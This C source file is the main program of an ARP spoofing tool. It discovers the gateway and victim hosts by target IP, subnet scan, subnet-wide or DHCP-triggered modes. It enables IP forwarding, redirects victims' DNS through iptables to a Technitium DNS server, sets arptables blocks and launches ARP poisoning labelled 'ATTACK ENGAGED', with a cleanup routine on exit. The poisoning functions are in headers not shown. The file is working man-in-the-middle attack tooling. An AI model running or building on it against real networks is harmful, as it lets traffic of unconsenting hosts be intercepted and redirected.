#include <arpa/inet.h>
#include <getopt.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "ARP/ARP_UTILS/arp_poison.h"
#include "ARP/ARP_UTILS/arp_scan.h"
#include "ARP/ARP_UTILS/utils_discovery.h"
#include "ARP/ARP_UTILS/utils_iptables.h"
#include "ARP/ARP_UTILS/utils_firewall.h"
int g_victim_count = 0;
struct Victim *g_victims = NULL;
unsigned char g_gateway_ip[4];
unsigned char g_gateway_mac[6];
unsigned char *g_gateway_ipv6_ll = NULL;
unsigned char *g_mac_alloc = NULL;
void handle_sigint(int sig) {
  (void)sig; // suppress unused warning
  printf("\n[SHUTDOWN] Caught SIGINT. Commencing graceful shutdown...\n");
  // De-poison the network cleanly
  if (g_victims && g_victim_count > 0) {
    heal_arp(g_victims, g_victim_count, g_gateway_ip, g_gateway_mac);
    free(g_victims);
  }
  // Revert iptables rules
  cleanup_dns_redirect();
  
  // Revert arptables rules
  cleanup_arp_block();

  if (g_mac_alloc)
    free(g_mac_alloc);
  exit(EXIT_SUCCESS);
}
void print_hex_mac(unsigned char *mac) {
  for (int i = 0; i < 6; ++i)
    printf("%02x%c", mac[i], i == 5 ? '\n' : ':');
}
int main(int argc, char *argv[]) {
  // Unbuffer stdout immediately to ensure logs are captured in redirected environments
  setvbuf(stdout, NULL, _IONBF, 0);

  // Register Signal handler early for graceful shutdown even during discovery
  signal(SIGINT, handle_sigint);

  char *victim_ip_str = NULL;
  char *gateway_ip_str = NULL;
  int wide_mode = 0;
  int smart_mode = 0;
  int opt;
  while ((opt = getopt(argc, argv, "t:g:wsh")) != -1) {
    switch (opt) {
    case 't':
      victim_ip_str = optarg;
      break;
    case 'g':
      gateway_ip_str = optarg;
      break;
    case 'w':
      wide_mode = 1;
      break;
    case 's':
      smart_mode = 1;
      break;
    case 'h':
    default:
      fprintf(stderr, "Usage: %s [-t <victim_ip>] [-g <gateway_ip>] [-w] [-s]\n",
              argv[0]);
      fprintf(stderr, "  -t <ip>  Target a specific victim IP.\n");
      fprintf(stderr, "  -g <ip>  Override default gateway IP.\n");
      fprintf(stderr, "  -w       Subnet-Wide Brute Force mode (poisons entire range).\n");
      fprintf(stderr, "  -s       Smart DHCP mode (poisons on new connections).\n");
      exit(EXIT_FAILURE);
    }
  }
  printf("[*] Starting ARP Spoofer Engine...\n");
  // 1. Resolve Gateway IP
  if (gateway_ip_str) {
    struct in_addr jw_addr;
    if (inet_pton(AF_INET, gateway_ip_str, &jw_addr) != 1) {
      fprintf(stderr, "Invalid Gateway IP format.\n");
      exit(EXIT_FAILURE);
    }
    memcpy(g_gateway_ip, &jw_addr.s_addr, 4);
    printf("[*] Using provided Gateway IP: %d.%d.%d.%d\n", g_gateway_ip[0],
           g_gateway_ip[1], g_gateway_ip[2], g_gateway_ip[3]);
  } else {
    printf("[*] Discovering default gateway...\n");
    unsigned char *gw_ip_alloc = get_default_gateway_ip();
    if (!gw_ip_alloc) {
      fprintf(stderr, "[!] Failed to discover default gateway.\n");
      exit(EXIT_FAILURE);
    }
    memcpy(g_gateway_ip, gw_ip_alloc, 4);
    free(gw_ip_alloc);
    printf("[+] Discovered Gateway IP: %d.%d.%d.%d\n", g_gateway_ip[0],
           g_gateway_ip[1], g_gateway_ip[2], g_gateway_ip[3]);
  }
  // 2. Resolve Gateway MAC
  g_mac_alloc = get_mac_from_ip(g_gateway_ip);
  if (!g_mac_alloc) {
    fprintf(stderr, "[!] Failed to resolve Gateway MAC over eth0.\n");
    exit(EXIT_FAILURE);
  }
  memcpy(g_gateway_mac, g_mac_alloc, 6);
  printf("[*] Discovered Gateway MAC:  ");
  print_hex_mac(g_gateway_mac);
  // 2.5 Resolve Gateway IPv6 Link-Local Address
  printf("[*] Discovering IPv6 gateway link-local address...\n");
  g_gateway_ipv6_ll = get_gateway_ipv6_ll();
  if (g_gateway_ipv6_ll) {
    char addr_str[INET6_ADDRSTRLEN];
    inet_ntop(AF_INET6, g_gateway_ipv6_ll, addr_str, sizeof(addr_str));
    printf("[+] Discovered IPv6 Gateway Address: %s\n", addr_str);
  } else {
    printf("[!] Failed to discover IPv6 gateway. IPv6 blocking will be inactive.\n");
  }
  // 3. Resolve Victims
  if (victim_ip_str) {
    printf("[*] Using single targeted victim...\n");
    struct in_addr vic_addr;
    if (inet_pton(AF_INET, victim_ip_str, &vic_addr) != 1) {
      fprintf(stderr, "Invalid Target (Victim) IP format.\n");
      exit(EXIT_FAILURE);
    }
    g_victims = malloc(sizeof(struct Victim));
    if (!g_victims) {
      fprintf(stderr, "[!] Failed to allocate memory for victim.\n");
      exit(EXIT_FAILURE);
    }
    memcpy(g_victims[0].ip, &vic_addr.s_addr, 4);
    unsigned char *v_mac_alloc = get_mac_from_ip(g_victims[0].ip);
    if (!v_mac_alloc) {
      fprintf(stderr, "[!] Failed to resolve Victim MAC for %s over eth0.\n",
              victim_ip_str);
      free(g_victims);
      exit(EXIT_FAILURE);
    }
    memcpy(g_victims[0].mac, v_mac_alloc, 6);
    free(v_mac_alloc);
    g_victim_count = 1;
    printf("[+] Found %d victims on the network.\n", g_victim_count);
  } else if (!wide_mode && !smart_mode) {
    printf("[*] Discovering network victims...\n");
    g_victims = scan_network(g_gateway_ip, &g_victim_count);
    if (!g_victims || g_victim_count == 0 || g_victim_count > 512) {
      fprintf(stderr, "[!] Failed to scan network or no victims found.\n");
      // Memory handled gracefully inside scan_network if empty
      if (g_mac_alloc)
        free(g_mac_alloc);
      exit(EXIT_FAILURE);
    }
    printf("[+] Found %d victims on the network.\n", g_victim_count);
  }
  // Setup Packet Forwarding and IPTables
  printf("[*] Configuring internal packet routing...\n");
  enable_ip_forwarding();
  printf("[*] Integrating with Technitium DNS...\n");
  setup_dns_redirect();

  // ARP-Kill Protection Strategy
  setup_arp_block(g_gateway_mac, g_victims, g_victim_count);

  // Launch Loop
  printf("\n[*] >>> ATTACK ENGAGED : ARP poisoning Engine active! <<<\n");
  printf("[*] (Press Ctrl+C to cleanly heal the network and exit)\n\n");

  if (wide_mode) {
    start_wide_poisoning(g_gateway_ip, g_gateway_mac, g_gateway_ipv6_ll);
  } else if (smart_mode) {
    start_smart_poisoning(g_gateway_ip, g_gateway_mac, g_gateway_ipv6_ll);
  } else {
    start_poisoning(g_victims, g_victim_count, g_gateway_ip, g_gateway_mac, g_gateway_ipv6_ll);
  }
  // Only reached if start_poisoning exits
  cleanup_dns_redirect();
  if (g_victims)
    free(g_victims);
  if (g_mac_alloc)
    free(g_mac_alloc);
  if (g_gateway_ipv6_ll)
    free(g_gateway_ipv6_ll);
  return EXIT_SUCCESS;
}

